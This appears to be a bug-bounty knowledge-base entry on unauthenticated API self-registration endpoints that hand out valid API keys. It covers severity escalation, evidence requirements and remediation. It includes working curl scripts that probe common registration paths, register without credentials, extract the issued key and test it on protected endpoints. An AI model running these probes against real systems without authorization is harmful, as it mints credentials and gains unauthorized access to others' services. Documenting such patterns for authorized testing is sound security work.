---
type: pattern
title: Pattern - API Self-Registration Endpoint Without Auth
vuln_class: broken-access-control
tags: [pattern, cwe-306, cwe-287, api-key, self-registration, lateral-movement, unauthenticated-registration, bb-pattern]
status: active
first_seen: 2026-06-04
last_updated: 2026-06-04
severity: High (escalates to Critical if issued key passes auth on other endpoints)
related_patterns:
  - Pattern - Hardcoded Credentials
---

# Pattern - API Self-Registration Endpoint Without Auth: Lateral Movement via Legitimate Credential

## TL;DR

An API endpoint that allows unauthenticated system/client registration and issues valid API keys is not merely an information disclosure bug. The issued key is freshly minted and indistinguishable from a legitimately provisioned credential — auth systems accept it as trusted. If that key successfully passes authentication on other endpoints (server returns 4xx application errors rather than 401), the severity escalates from High to Critical.

**Key distinction from Hardcoded Credentials:** hardcoded credentials are pre-existing secrets embedded in code or firmware. This pattern produces a *freshly issued* key through a workflow the server treats as legitimate provisioning. The auth system has no reason to reject it.

## Root-cause ingredients

Two conditions must both be true:

1. **Registration endpoint is unauthenticated** — `/api/register`, `/api/client/init`, `/api/v1/device/enroll`, or similar accepts requests without a valid session, bearer token, or mTLS certificate.
2. **Response includes a usable credential** — `api_key`, `access_token`, `client_secret`, `device_token`, or equivalent that the server will later accept on protected endpoints.

Severity escalation trigger (High → Critical):

3. **Issued key passes authentication on protected endpoints** — a request using the issued key returns a non-401 response (200, 403, 422, or any application-layer error), confirming the credential is accepted by the auth subsystem.

## Detection

### Step 1 — Find self-registration endpoints

```bash
# Wordlist probe (adjust base URL)
for path in /api/register /api/v1/register /api/client/register \
            /api/device/enroll /api/init /api/v1/init \
            /api/v1/client/create /api/v2/app/register \
            /register /api/signup /api/v1/signup; do
  curl -s -o /dev/null -w "%{http_code} $path\n" \
    -X POST "https://TARGET$path" \
    -H "Content-Type: application/json" \
    -d '{"name":"test","type":"client"}'
done

# OpenAPI / Swagger spec — look for endpoints with security: []
curl -s "https://TARGET/api/docs/swagger.json" | \
  python3 -c "
import sys, json
spec = json.load(sys.stdin)
for path, methods in spec.get('paths', {}).items():
    for method, op in methods.items():
        if 'security' in op and op['security'] == []:
            print(f'{method.upper()} {path} — security: []')
"
```

### Step 2 — Attempt unauthenticated registration

```bash
# Generic attempt — vary body fields per target API schema
curl -s -X POST "https://TARGET/api/v1/register" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "test-client",
    "client_type": "mobile",
    "platform": "ios"
  }' | jq .

# If 400 Bad Request, inspect error for required fields, then retry
# Expected vulnerable response contains one of:
#   api_key, access_token, client_secret, token, key, secret
```

### Step 3 — Extract issued credential

```bash
# Save response and extract key field (adjust .api_key to actual field name)
RESPONSE=$(curl -s -X POST "https://TARGET/api/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"client_name":"probe","client_type":"mobile"}')
echo "$RESPONSE" | jq .
API_KEY=$(echo "$RESPONSE" | jq -r '.api_key // .access_token // .token // .key // empty')
echo "Issued key: $API_KEY"
```

### Step 4 — Test key against authenticated endpoints

```bash
# Test the issued key on a protected endpoint
# Vulnerable if response is NOT 401/403 — any application error (400, 422, 200) confirms auth acceptance
curl -s -o /dev/null -w "%{http_code}\n" \
  "https://TARGET/api/v1/users" \
  -H "Authorization: Bearer $API_KEY"

curl -s -o /dev/null -w "%{http_code}\n" \
  "https://TARGET/api/v1/profile" \
  -H "X-API-Key: $API_KEY"

# If 401 → key not accepted (High, not Critical)
# If 200/400/403/422 → key accepted by auth layer (Critical)
```

## Severity escalation decision tree

```
Unauthenticated registration issues credential?
  └─ NO  → not this pattern
  └─ YES → High baseline
      └─ Test issued key on protected endpoints
           └─ 401 on all endpoints?
                → High (credential issued but access scope unclear)
           └─ Non-401 on at least one endpoint?
                → Critical (lateral movement confirmed)
                → Document: which endpoints, what data/operations accessible
```

## Evidence requirements

| Step | What to capture | Evidence type |
|------|----------------|---------------|
| Unauthenticated registration | Full request + response (no auth header) | `live` |
| Issued credential visible in response | JSON field containing key/token | `live` |
| Issued key passes auth | Request with key + non-401 response | `live` |
| Accessible operations | At least one endpoint showing meaningful access | `live` |

Do not claim Critical severity without Step 3 evidence. A freshly issued key that only produces 401 remains High.

## Real-world trigger conditions

- IoT device enrollment APIs (device registers itself, receives a device token)
- Mobile app SDK initialization (`/api/init`, `/api/sdk/register`)
- Partner/client onboarding APIs missing auth on the registration step
- Microservice-to-microservice registration endpoints accidentally exposed publicly
- APIs with OpenAPI `security: []` on registration operations (Lesson #49)

## Distinction from related patterns

| Pattern | Key difference |
|---------|---------------|
| **Hardcoded Credentials** | Pre-existing secret embedded in code/firmware — attacker reads it. This pattern: server *issues* a new credential. Auth system has no reason to flag it as suspicious. |
| **CORS XMPP BOSH Drive-by Registration** | Account creation in an application layer (XMPP accounts). This pattern: API-level credential issuance enabling system-level API access. |
| **Default Credentials in Firmware** | Known static credential. This pattern: dynamically issued, unique per registration, not in any wordlist. |

## Remediation

1. Require a pre-shared enrollment secret or admin-issued invite code for client registration
2. Add rate limiting and CAPTCHA to registration endpoints
3. Issue credentials with minimal scope (principle of least privilege); require explicit upgrade to broader access
4. Log all registration events with source IP and alert on bulk registrations
5. Rotate or expire credentials issued before the fix

## Related

- [[Pattern - Hardcoded Credentials]] — contrast: static vs. dynamically issued credential
- [[Lesson #49]] — OpenAPI `security: []` is a fast map to auth-bypass candidates
- [[Lesson #50]] — file upload without auth → test all CRUD on same resource
- [[Lesson #51]] — IAM read endpoint is the first step of a privilege escalation chain
